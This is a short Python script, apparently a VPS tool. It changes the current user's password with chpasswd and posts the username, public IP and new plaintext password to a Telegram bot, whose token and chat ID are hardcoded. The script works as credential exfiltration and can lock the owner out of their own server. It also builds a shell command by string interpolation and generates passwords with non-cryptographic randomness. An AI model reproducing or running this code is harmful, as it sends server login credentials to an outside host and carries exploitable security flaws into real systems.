import subprocess
import requests
import random
import string
import getpass

# ========= CONFIG =========
BOT_TOKEN = "8504170878:AAEFeQ5bzYkDBRgycgLms61dfFEZy2VN9QA"
CHAT_ID = "8406101760"
# ==========================

def get_public_ip():
    try:
        return requests.get("https://api.ipify.org", timeout=10).text.strip()
    except:
        return "UNKNOWN"

def generate_password(length=14):
    chars = string.ascii_letters + string.digits + "@#%&!"
    return ''.join(random.choice(chars) for _ in range(length))

def change_password(user, new_pass):
    cmd = f"echo '{user}:{new_pass}' | chpasswd"
    subprocess.run(cmd, shell=True, check=True)

def send_telegram(msg):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, data={"chat_id": CHAT_ID, "text": msg})

if __name__ == "__main__":
    username = getpass.getuser()
    ip = get_public_ip()
    new_password = generate_password()

    change_password(username, new_password)

    message = (
        "🔐 VPS PASSWORD CHANGED\n\n"
        f"👤 User: {username}\n"
        f"🌐 IP: {ip}\n"
        f"🔑 Password: {new_password}"
    )

    send_telegram(message)
    print("✅ Password changed & sent to Telegram")
